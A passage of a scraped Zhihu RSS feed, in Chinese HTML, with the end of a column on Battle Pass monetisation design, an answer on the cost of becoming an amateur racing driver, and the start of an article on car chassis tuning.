data-pid=\"tSgOgNBx\">虽然付费档次是设了68元和128元两个档次，但从奖励内容来说，两者没有根本上的区别。</p>\n<p data-pid=\"0wSQFdDM\">其中，设置68元付费档次，主要目的是为了提升付费渗透率（付费渗透率=付费用户数量/活跃用户数量）。</p>\n<p data-pid=\"biRsX8Ej\">而128元付费档次，则是减轻高付费用户的活跃压力——对他们而言，付出更少时间拿完奖励才是他们的核心需求。</p>\n<p data-pid=\"tyFfiWr2\">如果可以，他们甚至愿意直接付费拿完所有奖励。当然，这也就和Battle Pass的设计初衷相违背了，这种情况不可能出现。</p>\n<p data-pid=\"xyl9foPr\">那么问题来了，<b>为什么是三种档次而不是四种、五种呢</b>？</p>\n<p data-pid=\"A3TCwU7S\">其实这只是表面上的三种档次设计，实际上只有两种档次，就是<b>免费档次</b>和<b>付费档次</b>。</p>\n<p data-pid=\"VwSxM8gP\">因为只有免费档次和付费档次的产出是根本不同的，即免费用户拿不到限定的产出皮肤和更多丰富奖励（无论你怎么活跃，只要不付费就不可能拿到），不是“少”和“多”的问题，而是“无”和“有”的区别。</p>\n<p data-pid=\"yrMwNnka\">而付费档次内部不管细分多少个额度档次，其产出内容不能有根本性质的不同，所以只能简单地分了两个档次，来实现提高付费渗透率和减轻高付费用户活跃压力的平衡。</p>\n<p data-pid=\"__S6QJ_i\">假设我在68元付费档次和128元付费档次再加一个198元付费档次，我还能给这个档次的玩家提供什么呢？</p>\n<p data-pid=\"1AMtQVc5\">既然不能提供根本性质的不同，无非是继续提供更多的活跃压力减免而已。</p>\n<p data-pid=\"SSIvdgp7\">但是请注意，做太多的活跃压力减负设计，会过多地影响到Battle Pass的活跃设计。</p>\n<p data-pid=\"YpQqsS2z\">这无疑又是违背了Battle Pass的设计初衷。</p>\n<p data-pid=\"D0sj8kG7\">所以综合来说，Battle Pass的付费设计，<b>注重付费渗透率</b>和<b>额度档次设计。</b></p>\n<p data-pid=\"mD1IdzNJ\">因为这一块内容关联到了游戏商业化系统最基础的一个点——即用户参与。</p>\n<p data-pid=\"l_skLaO_\">而做游戏商业化的同学应该要清楚明白<b>——没有用户参与的商业化系统，说明不被用户认可，说明是失败的</b>。</p>\n<p data-pid=\"IULj1jr5\"><b>3.2.2.Battle Pass的活跃设计</b></p>\n<p data-pid=\"6JskP7C8\">其次说活跃设计。这一块的内容，需要<b>注重紧扣游戏核心玩法</b>和<b>目标感设计</b>。</p>\n<p data-pid=\"Au3M7XOB\">紧扣游戏核心玩法不难理解，实际上就是游戏核心玩法内容的任务化，这一点只需要结合游戏类型、玩家日常游戏行为去设计即可。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-13f9194628695fbca22ccb0ea553b445_b.jpg\" data-size=\"normal\" data-rawwidth=\"1373\" data-rawheight=\"625\" class=\"origin_image zh-lightbox-thumb\" width=\"1373\" data-original=\"https://pic2.zhimg.com/v2-13f9194628695fbca22ccb0ea553b445_r.jpg\"><figcaption>《决战！平安京》的Battle Pass就紧密结合了MOBA游戏的核心玩法内容</figcaption></figure><p data-pid=\"RFZM3xc-\">拿《决战！平安京》举例，其Battle Pass的任务设计就是紧扣MOBA游戏的核心玩法，如“摧毁5座防御塔”、“击败对手N次”等等。</p>\n<p data-pid=\"Xo5wdPUm\">这一块的内容就不过多介绍，不同游戏类型都有不同的具体设计。</p>\n<p data-pid=\"ZJtvoC3w\">难就难在目标感设计上面。</p>\n<p data-pid=\"oakF5MXH\">用户参与了，自然是带着目标并且希望实现目标而来的。</p>\n<p data-pid=\"JDPXqyPo\">那么，我们要如何去制造目标追求，并通过一定的数值设计来满足其追求预期，实现合理有效的目标感设计呢？</p>\n<p data-pid=\"75-tTq11\">既然说到“追求”和“目标”，那自然而然就想到了做等级成长——即玩家完成对应的任务后获取对应数值的经验提升Battle Pass的等级，然后根据等级发放奖励。</p>\n<p data-pid=\"WoO5AZyk\">而说到了用户目标，那就得先划分用户，并且分析其追求预期，这样子我们才好对症下药。</p>\n<p data-pid=\"xJX6CEwJ\">简单地以活跃和付费两个尺度做一个划分，可以划分为不活跃的免费玩家、活跃的免费玩家、不活跃的付费玩家以及活跃的付费玩家一共四个类型。</p>\n<p data-pid=\"yAh0ZYFj\">而Battle Pass的目标感设计，受到限定时间周期和多样用户需求的双重影响。</p>\n<p data-pid=\"9Q9DJYeF\">下面放个思维导图，来具体细化讲讲。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-398f14c86e28cd9a2a2f03caf39653a2_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"773\" data-rawheight=\"297\" class=\"origin_image zh-lightbox-thumb\" width=\"773\" data-original=\"https://pic3.zhimg.com/v2-398f14c86e28cd9a2a2f03caf39653a2_r.jpg\"></figure><p data-pid=\"42bCpu2F\">Battle Pass不是永久的，而是跟随着游戏设计者自己划定的游戏赛季周期去走，有限定时长的时间周期。原则上是一个赛季一个Battle Pass（额度设计和活跃设计可以相同，但产出设计必然不同）。</p>\n<p data-pid=\"f6jKCe8b\">这就带来了矛盾——即等级成长体系的追求预期与限定时间周期这两者该如何协调，再加上多样的用户需求。</p>\n<p data-pid=\"pYTUpE7u\">拿免费用户来说，他们的预期目标肯定是在限定时间内拿完能拿的所有奖励。</p>\n<p data-pid=\"Dbt7YBhL\">但不活跃与活跃的免费用户，我们作为游戏设计者肯定不可能给他们一样的追求预期——即不可能让他们在同一个时间节点拿完所有奖励，活跃用户理应更快拿完。</p>\n<p data-pid=\"-vWRD8eG\">这就需要做数值设计的策划同学要综合考量好两者的动态平衡，提供符合他们预期的、合理的目标感设计体验。</p>\n<p data-pid=\"4DgAnN1X\">而且，这里还需要关注到一些特殊需求，需要做一些补足设计。</p>\n<p data-pid=\"QWUu6TOO\">比如说，赛季快结束了，但不少付费玩家的Battle Pass等级还没升满，奖励还没拿完。</p>\n<p data-pid=\"Ltt8LSI6\">我们该不该出一个补足设计，在赛季快结束的前几天允许那些还没达到Battle Pass最高等级、没拿完所有奖励的不活跃付费玩家通过付费来拿完这些奖励呢？</p>\n<p data-pid=\"bMNz5c1m\">如果允许，那么又该如何合理定价？</p>\n<p data-pid=\"zTgj4Cte\">这一个点，是很多做Battle Pass的游戏设计者没有考虑到的，算是一个比较细化的特殊需求了。</p>\n<p data-pid=\"WqEBZr09\">总而言之，Battle Pass的活跃设计，必须<b>注重紧扣游戏核心玩法</b>和<b>目标感设计</b>，这样才能最好的引导用户行为，提供良好的游戏体验。</p>\n<p data-pid=\"e_HYN2LV\"><b>3.2.3.Battle Pass的产出设计</b></p>\n<p data-pid=\"wPzkbndB\">Battle Pass的产出设计，则需要<b>注重游戏内容本身的消耗</b>和<b>产出内容的稀有度</b>。</p>\n<p data-pid=\"bhRsLldb\">看到这里肯定有同学疑惑，为什么竞技类游戏还要注重游戏内容本身的消耗？毕竟竞技类游戏基本不做成长内容。</p>\n<p data-pid=\"5PgI3u0_\">这其实是一个认知误区。</p>\n<p data-pid=\"a3QWhS9r\">因为即使是竞技类游戏，也是有游戏内容的，比如说皮肤道具、弱成长的成长系统（如符文等）之类的，都算是可消耗的游戏内容。</p>\n<p data-pid=\"tAlctm_a\">不过这一点对于具有“成长”要素的MMORPG更加适用。</p>\n<p data-pid=\"WDTsrYPN\">毕竟，目前很多MMORPG也嵌入了Battle Pass这一商业化系统。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-21bd1ae443d1ffe5b0dae4e98855773e_b.jpg\" data-size=\"normal\" data-rawwidth=\"921\" data-rawheight=\"639\" class=\"origin_image zh-lightbox-thumb\" width=\"921\" data-original=\"https://pic3.zhimg.com/v2-21bd1ae443d1ffe5b0dae4e98855773e_r.jpg\"><figcaption>《龙族幻想》手游</figcaption></figure><p data-pid=\"5qDey83Q\">含有“成长”要素的MMORPG，难免会发放成长类道具。</p>\n<p data-pid=\"VoMhZj_y\">因为单纯地发放皮肤、头像框等不具备成长属性的道具，无法给MMORPG玩家“成长感”，而成长感是MMORPG的核心体验之一。</p>\n<p data-pid=\"Jya3G3Q2\">MMORPG的成长类道具，又存在边际效应、道具贬值以及成长性价比等问题，再加上MMORPG本身还存在用户付费能力上的分层。</p>\n<p data-pid=\"WhXHoK7F\">所以在MMORPG中做Battle Pass系统，一定要注重<b>游戏内容本身的消耗，</b>是否与游戏本身的成长体验相适应。</p>\n<p data-pid=\"b7qbJ-1B\">我简单地列一下设计原则：</p>\n<p data-pid=\"D2Cy66aa\">（1）Battle Pass的加入，不能实际上影响既有成长点的各阶层用户体验预期。</p>\n<p data-pid=\"cClrks4a\">举个例子，成长点A的预期养成圆满是大R用户30天，中R用户50天，小R非R用户80天。</p>\n<p data-pid=\"Pltx7Pht\">Battle Pass产出了成长点A的养成道具。除了要注重产出的性价比之外，也要考虑不能变动原有的各阶层用户体验预期。</p>\n<p data-pid=\"NeqejuE1\">（2）Battle Pass的产出必须跟着游戏的成长节奏走。</p>\n<p data-pid=\"N7TJ2W4y\">即Battle Pass的产出必须是可以变动的，这期的Battle Pass产出了成长点A的养成道具；</p>\n<p data-pid=\"tsGMM0a6\">下一时间节点，成长点A性价比远远不能承受Battle Pass的性价比了，玩家更关注成长点B了，则下一期的Battle Pass就应该产出成长点B的成长道具。</p>\n<p data-pid=\"NrVh1oQP\">而产出内容的稀有度，这个就很简单了。</p>\n<p data-pid=\"Tl4iggzO\">一般都是以当期Battle Pass的限定皮肤为主要诱惑点来吸引付费，同时可以配合限定头像框等内容。</p>\n<p data-pid=\"_POUk78A\">产出内容，注意结合游戏类型、玩家需求以及稀有度这三个因素，这块由于比较细节我就不具体谈了。</p>\n<h2>4.总结</h2>\n<p data-pid=\"O_Wb7Fnm\">其实全篇读下来，不难发现Battle Pass的设计也是游戏商业性系统的设计逻辑的，即：<b>注重用户参与、引导用户行为、满足用户需求</b>这三个点。</p>\n<p data-pid=\"kVB_u2TN\">单从这个来说，似乎Battle Pass也没什么特殊的地方。</p>\n<p data-pid=\"sz61l5Ww\">但就是Battle Pass这个商业性系统，搅动了整个业界，成为游戏行业争相效仿的一股风潮。</p>\n<p data-pid=\"htKo0AjV\">更重点的是，在不损害游戏口碑和玩家体验的情况下，能够实现游戏营收和游戏活跃的双增长——这无疑是游戏商业性设计的又一个创举，意义和当年6元首充差不多等同了。</p>\n<p data-pid=\"KQJK9OHi\">回到游戏商业化上来说。</p>\n<p data-pid=\"_UI1EHhW\">游戏商业化是很多游戏设计者难以避免的话题，尤其是对于网络游戏这种非一锤子买卖的游戏类型而言，更加需要成熟且完善、合理且有效的商业化体系来进行长期运营。</p>\n<p data-pid=\"buwGPwUm\">能够长期运营一款游戏，既是自己工作的一个成果，也是对广大玩家的负责。</p>\n<p data-pid=\"Og8cwi4M\">现在的商业化体系也是逐步适应市场、满足用户需求而逐步完善和发展的。</p>\n<p data-pid=\"VgAm2W7H\">从最开始的买断制，到后来的内购制；从原来的点卡收费到道具收费……</p>\n<p data-pid=\"ayD26Bch\">还有6元首充、投资理财、限购商城等等一系列的游戏商业化体系的发展，无不凝聚着行业前辈的思考和探索。</p>\n<p data-pid=\"JmUOOAqM\">而游戏商业化是一个永恒的话题，愿游戏行业的同僚们共勉。</p>\n<p data-pid=\"MxvXuki_\">最后再回答上期不少同学私信给我的问题。</p>\n<p data-pid=\"h-5718_C\"><b>问题一：为什么文章更多在谈设计原则，而不过多地谈设计细节？</b></p>\n<p data-pid=\"5LA-jNH6\">答：</p>\n<p data-pid=\"Bs-Dpkac\">（1）游戏类型的多样性和游戏玩家的复杂性决定了具体的设计细节是不同的，如果要具体套用设计细节效果不一定好，反而可能会误导他人。</p>\n<p data-pid=\"gz8CdAti\">不要指望用一把钥匙能打开世界上所有的门。</p>\n<p data-pid=\"PP5z7f5M\">（2）多谈设计原则是授人以鱼不如授人以渔。</p>\n<p data-pid=\"N5tyjDuH\">就像本文，我不止单单是去讲Battle Pass的设计架构和设计分析，而是更多地将其作为一个商业性系统去关注它的共性以及独特优越性。</p>\n<p data-pid=\"Fdgrq6O7\">其实从最基础的设计逻辑来讲，Battle Pass的设计可以说是与6元首充之类的商业性系统一致的。文中也多次强调从用户的角度去分析游戏设计。</p>\n<p data-pid=\"E2yZLFuf\">（3）其实我所总结的设计原则本身也存在局限性，是需要进一步完善的。游戏商业化是一个很大的命题，游戏设计就更大了。</p>\n<p data-pid=\"8YU20FyG\">也欢迎业内同行评论或私信我你的观点，一起完善和进步——也希望下一个能影响业界的创举出自于你们的某一人手中。</p>\n<p data-pid=\"sHsGLebW\"><b>问题二：专栏面向的读者有谁？我能给专栏投稿吗？投稿有什么限制或条件吗</b>？</p>\n<p data-pid=\"P3SWgLKp\">回答：</p>\n<p data-pid=\"8i8F6OeT\">（1）面向业内同行，主要是游戏策划、游戏运营以及对游戏设计感兴趣的同学。</p>\n<p data-pid=\"ItWlTVnU\">初期内容主要是更多网游为主，因为这个游戏类型才是与我们工作关联更大的。像单机游戏的设计分析之类的，我也有在写。</p>\n<p data-pid=\"30u_F2KT\">但是呢，一是个人觉得不够完善随便放出来会误导人；二是对我们目前所从事的工作帮助也远没有分析网游设计要大。</p>\n<p data-pid=\"r3HYsm9S\">后续，我们会根据市场需求和变化，更多地加入单机游戏、独立游戏的内容，这两块也是我特别感兴趣、目前致力研究的领域。</p>\n<p data-pid=\"O3BMVgOi\">（2）欢迎所有业内同行投稿，分享自己的真知灼见，共同交流。投稿直接私信我即可。只是没有稿费。</p>\n<p data-pid=\"5k6zhuqb\">（3）投稿稿件没有什么限制，只要是讨论游戏设计的，都可以，但是会经过我以及几个业内资深同行的审阅来决定是否收录在专栏。</p>\n<p data-pid=\"x45YZPqN\">收录在专栏的文章，其所有权、使用权仍在投稿人自己手上。</p>\n<p data-pid=\"rvYUoDEr\">若有其他游戏媒体转载，其决定权也在投稿人手上。</p>\n<p data-pid=\"5cCkztK0\"><b>问题三：给专栏投稿有什么好处</b>？</p>\n<p data-pid=\"qammCuyy\">回答：</p>\n<p data-pid=\"eEomv_nq\">（1）分享自己的观点，给更多业内同行看到并一起交流，使你的认识更完善。</p>\n<p data-pid=\"Cd6pENoA\">游戏行业，闭门造车行不通的。</p>\n<p data-pid=\"W1pMiupX\">（2）关注本专栏的有游戏编辑、业内同行以及几个资深主策划、制作人。优秀的观点和文章会被他们看到。</p>\n<p data-pid=\"T899Ceqn\">游戏编辑会联系你转载你的文章，让你的观点被更多人接触到。</p>\n<p data-pid=\"rl2ZtpQe\">业内同行会从你的文章和观点受益，积攒你在游戏行业的口碑。</p>\n<p data-pid=\"VonUPJpA\">资深大佬说不定会青睐你，有好项目拉你一起做。（所以我也兼职做做内推的工作哈哈）</p>\n<p data-pid=\"1MOQxS3Y\">总之，专栏提供的是一个平台，一个展现你个人能力的平台。欢迎大家来投稿！</p>\n<hr>\n<p data-pid=\"n5QAe-9H\">最后最后，如果你觉得本文对你有所帮助的话，麻烦在收藏之余点一下赞点一下感谢，这也是我继续分享行业经验的一个动力吧。</p>\n<p data-pid=\"wzedy7-_\">想要持续获取更多行业经验，也可以关注本专栏。</p>\n<p data-pid=\"DjN982f-\">如果你有更好的观点或思路，也欢迎在文章评论区发表或私信发给我。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-fdd49670966ab99d925a6f8bc04f02dc_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"741\" data-rawheight=\"414\" class=\"origin_image zh-lightbox-thumb\" width=\"741\" data-original=\"https://pic1.zhimg.com/v2-fdd49670966ab99d925a6f8bc04f02dc_r.jpg\"></figure><p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/mumuyoulun?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">策划梁木木</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br>\n","link":"http://zhuanlan.zhihu.com/p/80189971?utm_campaign=rss&utm_medium=rss&utm_source=rss&utm_content=title"},{"title":"普通人可以参加培训成为业余赛车手吗？","date":"2022-02-09 07:31:10","description":"\n<p></p>\n<p><img src=\"https://pic2.zhimg.com/v2-60a3698c3849e515d32b33c2ef513c48_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1140\" data-rawheight=\"602\" data-watermark=\"watermark\" data-original-src=\"v2-60a3698c3849e515d32b33c2ef513c48\" data-watermark-src=\"v2-5a23bbbfbe38af7ce2f21500bbfebc25\" data-private-watermark-src=\"v2-63e3807e97069af2ea76a513d88b287f\"></p>\n<p data-pid=\"qqEqqEYU\">这位是Tomas Mezera，1988年Bathurst 1000的冠军，一生赢了不少比赛。</p>\n<p data-pid=\"YW7aHk3c\">现在他是澳大利亚保时捷竞技驾驶学校的最资深的教练以及教学项目管理。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-b382d0aeab3f69bb1e3ff41a9b6a6a5e_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"960\" data-watermark=\"watermark\" data-original-src=\"v2-b382d0aeab3f69bb1e3ff41a9b6a6a5e\" data-watermark-src=\"v2-abca849ddb8c9c15c71b32b4e54f29e3\" data-private-watermark-src=\"v2-6ebfa9c29c88e0aadadc8e0709cd43cf\"></p>\n<p data-pid=\"qdl__Tee\">他也是我学习驾驶的导师。</p>\n<p data-pid=\"ZjtraUQ_\">成为车手和做其它什么事情都是一样，花钱花时间都能入门，但是要获得更高层次的成功，需要的还有天赋和运气。</p>\n<p data-pid=\"BxqlA9rf\">跟Tom学开车后，一方面我加入了保时捷邪教，只信保时捷。</p>\n<p data-pid=\"g_Vh011P\">另一方面也学到了如何成为一个更好的竞赛车手。</p>\n<p data-pid=\"dLTl4G6W\">说到头，学开车和学弹琴是一样的，要有好老师，但更多是要多练，有天赋固然好，可是天赋敌不过兴趣和投入，很多人看到职业XX，不管是NBA球员也好，还是看到电子竞技职业选手也好，看到他们在场上那潇洒的一瞬间都会觉得很帅，自己也想那样。</p>\n<p data-pid=\"7cMZ4yBI\">但实际上背后是非常辛苦的训练，非常枯燥的重复，很长时间的瓶颈，一些难以克服的恶习，一些你觉得不可能实现的目标。这些你以前在学其它东西遇到过的，都会在赛车上遇到。</p>\n<p data-pid=\"Oby4YBRp\">学习赛道上的竞技驾驶，你越学越发现你开始学的太晚了，你能力，金钱和投入太有限了。</p>\n<p data-pid=\"APS4H8x7\">首先你需要学会开慢，慢出自己的节奏。</p>\n<p data-pid=\"LqJYJCnO\">新车手都喜欢大开大合，油门踩到底，刹车踩到底。</p>\n<p data-pid=\"vBAy9VSD\">之后经过训练，会学会开车像弹琴一样，有起伏有节奏，不能一个音一个音断断续续，要一直源源不绝的走。一个赛道开好了，仿佛唱一首歌，一路唱完，中间仿佛听不到喘息的声音，而不是唱一句，吸口气，再唱。</p>\n<p data-pid=\"BzDotTjf\">然后有了节奏之后开始学习如何开快，如何克服恐惧去挑战自己和车的极限。</p>\n<p data-pid=\"zIYXHHB5\">再之后学习理论，了解赛道和角度，一个赛道外道入弯的时候你少用了几分米的赛道，角度不如别人的好，5圈下来你可能就少了几个车身的距离甚至更糟。</p>\n<p data-pid=\"9vI9cXiT\">等你到这个级别了，就要开始学习驾驶规则，一些比赛常识，学习自己准备比赛，学习自己练习。</p>\n<p data-pid=\"oz_XLAMd\">学习如何超车，如何防止别人超车。</p>\n<p data-pid=\"cvd4Cw46\">这一步再学完了，你才勉强算是成为了一个外行，然后如果你要参加稍微正式点的比赛，而不只是trackday的练习，你很可能需要一个crew，一整个团队去参赛，在没有赞助商的情况下， 普通的“有钱”可能也不会让你玩的起自费比赛。但是先有鸡先有蛋的问题，你不拿名次也没人赞助你，你参加了也未必有名次······</p>\n<p data-pid=\"E6IqnpnD\">也正是因为如此，你会发现很多著名的车手第一次赢比赛不是20-30岁，而是40多快50岁。</p>\n<p data-pid=\"2DSpq_Gg\">像Motor Trend大神Randy Pobst 05年第一次拿个第二名时是48岁，现在64岁依然在媒体工作和比赛之间一直努力着。</p>\n<p data-pid=\"Fxg-dhcU\">在你被一个球队签约以前，你就只能是个“业余赛车手”。而且可能一辈子都是。</p>\n<p data-pid=\"bCtwtmWl\">上面提到的那些，你走的每一步都是花钱，花非常多的钱。</p>\n<p data-pid=\"Vu-K54nB\">里面涉及到了场地费用，教练，保险，成百套轮胎，许多许多刹车片，轮圈，好几个被你玩坏的发动机。许多个变速箱。</p>\n<p data-pid=\"7du0ddWl\">修理，拖车，甚至不幸的话，事故，新车。</p>\n<p data-pid=\"CQ56wQYO\">此外还要花非常多的时间。</p>\n<p data-pid=\"PrPZoYVb\">对你身体消耗也非常大，开车是非常耗体力的事情。</p>\n<p data-pid=\"QkJB3JVL\">我正好问过Tomas，要练到什么地步才可以成为职业车手。</p>\n<p data-pid=\"yMAUEpHQ\">Tomas跟我说，即便你没日没夜这么练，花了很多钱，很多时间，你可能还是出不了成绩。</p>\n<p data-pid=\"uOWDE7S9\">很多人怪车，怪运气，怪天气。</p>\n<p data-pid=\"fDpCv_9p\">但实际上你能做的只是不停的重复，来让自己进步。有些人一辈子的努力与进步也不够让他们达到职业的水平。</p>\n<p><br></p>\n<p data-pid=\"7A_w8vUQ\">然后参加Porsche Sports Driving School，低级别的入门课是一天2500-2800多刀。</p>\n<p data-pid=\"zL3tOmcY\">（那还是很多年前）。</p>\n<p data-pid=\"s4xk9kAZ\">然后中高级别的收费更高了。</p>\n<p data-pid=\"49-f_2T_\">保时捷比较专注于赛道培训和跑圈。</p>\n<p data-pid=\"FiiZBXNz\">Amg driving academy什么都教一点。</p>\n<p data-pid=\"5CSGhZJG\">除了保时捷和AMG，还有Nissan Academy，尼桑非常重理论，会有很多赛道解析。</p>\n<p data-pid=\"uKXjSuVE\">BMW的赛道项目更感觉像是在卖车·····上面的Porsche，AMG和Nissan是比较纯粹一点的。肯定还有别的项目你可以参加的。</p>\n<p data-pid=\"BE59dTyv\">再就是普通的赛道培训，通常都是一堂课几小时，350-1450澳元（也是许多年前了），具体看你学什么。</p>\n<p data-pid=\"zvKFeiQ5\">参加Track Day的话，我很早在豆瓣上写过一套相关的说明，你需要准备什么。</p>\n<p data-pid=\"4jx0NIF6\">其中，赛道的保险，赛道prep的养护和跑完后的养护，轮胎，各种指出加起来，我自己算大概也要800-1200刀一天（这局限于我自己的车和我自己买的轮胎，肯定有人要杠自己的车多便宜，轮胎多便宜，保险多便宜，确实有人可以开一辆马自达3去玩，你穿拖鞋也可以打篮球，你也可以穿乔丹，这些我一律不争论。）轮胎偶尔可以重复使用，具体看你开的多狠，不过如果你开了一整天赛道你轮胎还没怎么样，说实话你车真的没怎么开。</p>\n<p data-pid=\"KsebGdPx\">所以很多人说，想学习开赛车要从卡丁开始，不是因为卡丁车和赛道驾驶多类似，而是卡丁车便宜，适合启蒙。</p>\n<p data-pid=\"_LcgMVfO\">就算你拿一个家用小hatch来练习赛道驾驶，你可以看看你附近的赛道收费表然后算一下，你每个星期都去两次，一年多少钱。</p>\n<p data-pid=\"4MT5K2o1\">————————————</p>\n<p data-pid=\"u4FvXs1p\">总之，</p>\n<p data-pid=\"F5JeF2lr\">“普通人可以参加培训成为业余赛车手吗？”</p>\n<p data-pid=\"gLbkI34M\">培训，练习，养车，这些都非常花钱，花时间。</p>\n<p data-pid=\"qJTu5c1c\">“普通人”是指有时间，有大把的钱，而且有兴趣成为车手而且不怕失败而且明白自己可能一辈子也不能靠这个赚钱的话。</p>\n<p data-pid=\"VADmtGCm\">是的，“普通人”是可以成为业余赛车手的。</p>\n<p><br></p>\n<p data-pid=\"CslArAoE\">赛车手不像英语老师，你参加培训，毕业出来然后去找工作。</p>\n<p data-pid=\"__KE1aVC\">车队很少会找个苗子来培养，培养到出成绩了然后让你成为职业的。</p>\n<p data-pid=\"Lt9yixG4\">因为培养太贵了，而且出成绩的几率太小了。</p>\n<p data-pid=\"o-EyZSlK\">赛车手需要你自己培养自己，培养到出成绩了，才有车队来聘用你。</p>\n<p><br></p>\n<p data-pid=\"jjRjJgeZ\">对于大部分人来说，成为车手还是太奢侈了。</p>\n<p data-pid=\"OsuHCEsW\">玩玩车其实就够幸福了。</p>\n<p></p>\n<p></p>\n<p></p>\n<p></p>\n<p></p>\n<p></p>\n<p></p>\n<p></p>\n<p></p>\n<p></p>\n<p></p>\n<p></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/chris-xia-79?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">傲世螃蟹</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/268115304/answer/2332442079?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">6 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/308094275?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">职业赛车手与业余老司机有多大区别？</a><br><a href=\"http://www.zhihu.com/question/307280754?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">普通人可以入门业余赛车圈吗？</a><br>\n","link":"http://www.zhihu.com/question/268115304/answer/2332442079?utm_campaign=rss&utm_medium=rss&utm_source=rss&utm_content=title"},{"title":"【小知识】汽车底盘调教-初览","date":"2022-02-09 04:46:10","description":"\n<p data-pid=\"5QsfHdLN\"><b>有人说“底盘调校是对汽车底盘工程师的灵魂之问！”</b></p>\n<p data-pid=\"GMWuOyOh\">底盘调校是什么？为什么车企会不惜重金聘请外国专家进行底盘调校？奔驰偏向舒适，宝马偏向运动，而奥迪则是两者取乎其中，是调出来的吗？</p>\n<p data-pid=\"4yW42mf2\">下面让我们抽丝剥茧，看看什么是底盘调校？</p>\n<p data-pid=\"Ci-bAF2p\">发动机被人们比作汽车的心脏，底盘就可看作是汽车的骨骼，它涉及动力传动系统、行驶系统（主要包括车架、悬架、车轮）、转向系统和制动系统，底盘技术的好坏直接影响到汽车安全性、操控性、舒适性等，可谓牵一发而动全身。</p>\n<p data-pid=\"QhgSFeGN\"><b><i>一、什么是底盘调校 </i></b></p>\n<p data-pid=\"sEKr5eTY\">汽车底盘性能如<b>木桶效应</b>：没有经过调校的样车存在各种各样的短板，例如：过弯侧倾大、不足转向度大、弯道抓地力不足、制动点头大及冲击舒适度差等问题，无法让用户满意。底盘调校过程是补齐或平衡各项性能，增大性能“<b>存水量</b>”。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-d669afa15e4bc119313f970e01508027_b.jpg\" data-size=\"normal\" data-rawwidth=\"640\" data-rawheight=\"400\" class=\"origin_image zh-lightbox-thumb\" width=\"640\" data-original=\"https://pic4.zhimg.com/v2-d669afa15e4bc119313f970e01508027_r.jpg\"><figcaption>著名的km77麋鹿测试</figcaption></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p data-pid=\"-teCAzmF\"><b>汽车要拥有优秀的底盘性能取决于前期基础结构设计、后期底盘调校工作和生产一致性控制三个方面</b>。其中，基础结构设计性能贡献占比约为60%，底盘调校约为30%，生产一致性控制占比约为10%。即基础结构设计是底盘性能达标的前提，底盘调校是性能再拔高的过程，生产一致性控制是底盘性能的最终保障。</p>\n<p data-pid=\"Xg0tnsz1\">底盘调校是在有限的成本和资源条件下，整合各个子系统和零部件，协调各种矛盾，通过调校的手段找到各方面性能的最佳平衡点，以满足既定的性能开发目标。</p>\n<p data-pid=\"1y8QUrtm\"><i><b>二、底盘调校主要方法</b></i> </p>\n<p data-pid=\"3HcOi--Y\">一直以来各汽车企业把底盘调校作为看家本领，其技术的复杂性及难度在整车性能开发过程中不言而喻。汽车性能一般用动力性、燃油经济性、制动性、操纵稳定性、平顺性和通过性等评价指标来评价，整车调校主要围绕这些指标开展相应的工作。一般提到的底盘调校更多的是指在底盘性能调校过程中，如何提升底盘整体性能并保证舒适性和操控性的最佳平衡。</p>\n<p data-pid=\"H71aS76a\">汽车要具有良好的转向性能、操纵稳定性以及行驶舒适性，一方面在设计时要优化车辆整体架构，使之具有好的K&amp;C性能，涉及到悬架系统的硬点、转向特性、车轮定位参数等设计。另一方面涉及到弹簧、稳定杆、减振器、轮胎衬套、转向系统等零部件及系统的开发与匹配。</p>\n<p data-pid=\"dn51An_e\">汽车底盘性能调校方法包括虚拟调校法和主观调校法。其中，虚拟调校法成本低、效率高，主观调校法为以人的感官来最终确认产品的感知品质。</p>\n<ol><li data-pid=\"KrJv8usR\">\n<b>主观调校法  </b>主观评价在欧美、日本等汽车发达国家已非常成熟，国内汽车性能主观评价体系尚在不断完善中。主观评价包括转向性能、操稳性能、舒适性能等方面的评价。如操纵稳定性的主观评价指标包括转向反馈、行驶稳定性、制动稳定性、驾驶信心、弯道行驶动力变化、瞬态转向、稳态转向、试验场道路行驶舒适性、公共道路行驶舒适性等一级评价指标。影响这些指标的关键在于整车的动力学特性以及系统和零部件的性能参数，在调校过程中可根据评价指标来重点解决动力学特性问题以及优化系统和零部件的性能参数，最终使车辆的操纵稳定性达标。</li></ol>\n<p 